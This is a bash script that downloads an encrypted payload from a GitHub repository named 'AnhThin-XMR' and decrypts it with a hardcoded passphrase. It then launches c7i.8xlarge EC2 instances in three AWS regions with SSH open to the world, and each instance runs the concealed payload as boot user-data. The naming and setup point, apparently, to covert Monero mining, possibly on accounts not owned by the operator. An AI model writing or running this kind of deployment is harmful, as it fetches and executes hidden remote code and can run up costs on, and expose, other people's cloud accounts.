#!/bin/bash

# List of AWS regions and corresponding AMI IDs
declare -A region_image_map=(
    ["us-east-1"]="ami-0e2c8caa4b6378d8c"
    ["us-west-2"]="ami-05d38da78ce859165"
    ["ap-northeast-1"]="ami-0b2cd2a95639e0e5b"
)

# GitHub URL containing encrypted user-data
user_data_url="https://github.com/hoanglonglouis/AnhThin-XMR/blob/main/hostdata.txt.enc"

# Temporary file paths
encrypted_user_data="/tmp/user_data.enc"
decrypted_user_data="/tmp/user_data.sh"

# Download encrypted user-data
curl -s "$user_data_url" -o "$encrypted_user_data"
if [ ! -s "$encrypted_user_data" ]; then
    echo "Error: Failed to download encrypted user-data."
    exit 1
fi

# OpenSSL decryption (ensure the passphrase is handled securely)
export OPENSSL_PASS="Hoanglong@237"
openssl enc -aes-256-cbc -d -salt -pbkdf2 -in "$encrypted_user_data" -out "$decrypted_user_data" -pass pass:"$OPENSSL_PASS"
if [ $? -ne 0 ] || [ ! -s "$decrypted_user_data" ]; then
    echo "Error: Failed to decrypt user-data."
    exit 1
fi
chmod +x "$decrypted_user_data"

# Convert user-data to base64
user_data_base64=$(base64 --wrap=0 "$decrypted_user_data")
if [ -z "$user_data_base64" ]; then
    echo "Error: Failed to encode user-data to Base64."
    exit 1
fi

# Iterate over each region
for region in "${!region_image_map[@]}"; do
    echo "Processing region: $region"
    image_id=${region_image_map[$region]}

    # Key Pair setup
    key_name="GodLong-$region"
    if ! aws ec2 describe-key-pairs --key-names "$key_name" --region "$region" > /dev/null 2>&1; then
        aws ec2 create-key-pair \
            --key-name "$key_name" \
            --region "$region" \
            --query "KeyMaterial" \
            --output text > "${key_name}.pem"
        chmod 400 "${key_name}.pem"
        echo "Key Pair $key_name created in $region"
    else
        echo "Key Pair $key_name already exists in $region"
    fi

    # Security Group setup
    sg_name="Random-$region"
    sg_id=$(aws ec2 describe-security-groups --group-names "$sg_name" --region "$region" --query "SecurityGroups[0].GroupId" --output text 2>/dev/null)
    if [ -z "$sg_id" ]; then
        sg_id=$(aws ec2 create-security-group \
            --group-name "$sg_name" \
            --description "Security group for $region" \
            --region "$region" \
            --query "GroupId" \
            --output text)
        echo "Security Group $sg_name created with ID $sg_id in $region"
    else
        echo "Security Group $sg_name already exists with ID $sg_id in $region"
    fi

    # Ensure SSH (22) is allowed
    if ! aws ec2 describe-security-groups --group-ids "$sg_id" --region "$region" \
        --query "SecurityGroups[0].IpPermissions[?FromPort==\`22\` && ToPort==\`22\` && IpRanges[?CidrIp==\`0.0.0.0/0\`]].IpRanges" \
        --output text | grep -q "0.0.0.0/0"; then
        aws ec2 authorize-security-group-ingress \
            --group-id "$sg_id" \
            --protocol tcp \
            --port 22 \
            --cidr 0.0.0.0/0 \
            --region "$region"
        echo "SSH (22) access enabled for Security Group $sg_name in $region"
    else
        echo "SSH (22) access already configured for Security Group $sg_name in $region"
    fi

    # Launch EC2 instance
    instance_id=$(aws ec2 run-instances \
        --image-id "$image_id" \
        --count 1 \
        --instance-type c7i.8xlarge \
        --key-name "$key_name" \
        --security-group-ids "$sg_id" \
        --user-data "$user_data_base64" \
        --region "$region" \
        --query "Instances[0].InstanceId" \
        --output text)
    
    if [ -z "$instance_id" ]; then
        echo "Error: Failed to launch EC2 instance in $region"
        exit 1
    fi

    echo "On-Demand Instance $instance_id created in $region using Key Pair $key_name and Security Group $sg_name"
done
